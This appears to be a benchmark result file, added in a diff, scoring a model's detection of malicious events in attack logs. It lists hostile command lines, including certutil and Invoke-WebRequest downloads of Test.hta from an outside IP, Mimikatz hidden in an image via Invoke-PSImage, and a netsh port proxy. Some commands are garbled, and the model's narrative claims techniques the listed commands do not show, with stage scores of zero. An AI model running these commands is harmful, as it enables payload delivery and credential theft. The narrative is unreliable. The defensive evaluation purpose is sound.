@@ -1,0 +1,154 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C net time \\127.0.0.1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003`n`` 1}\" - -*",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\05gtqq4u\\05gtqq4u.cmdline",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\jgxmesmb\\jgxmesmb.cmdline",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\paq2rlez\\paq2rlez.cmdline",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "netsh.exe interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "The adversary appears to be attempting a variety of attacks, likely as part of a larger campaign. The PowerShell commands suggest they may be using Empire, an open-source post-exploitation framework. They appear to have already gained initial access through a phishing spear-phish and were able to execute their own code. Next, they executed various collection tools, such as web scraping scripts, Mimikatz for credential dumping, and a netstat collector. They also attempted a privilege escalation exploit via T1059.003, but failed. Additionally, they ran several defense evasion techniques, like modifying browser settings and disabling antivirus. They seem to have been testing different methods for lateral movement, including creating new ports for remote access and exploiting DLL hijacking vulnerabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 1122,
+      "total_tokens": 59989,
+      "wall_clock_s": 18.198,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2692307692307692,
+      "recall": 0.1794871794871795,
+      "f1": 0.2153846153846154,
+      "tp": 7,
+      "fp": 19,
+      "fn": 32
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 26,
+      "fn": 37,
+      "recall_partial": 0.06756756756756757
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 1122,
+      "total_tokens": 59989,
+      "wall_clock_s": 18.198,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
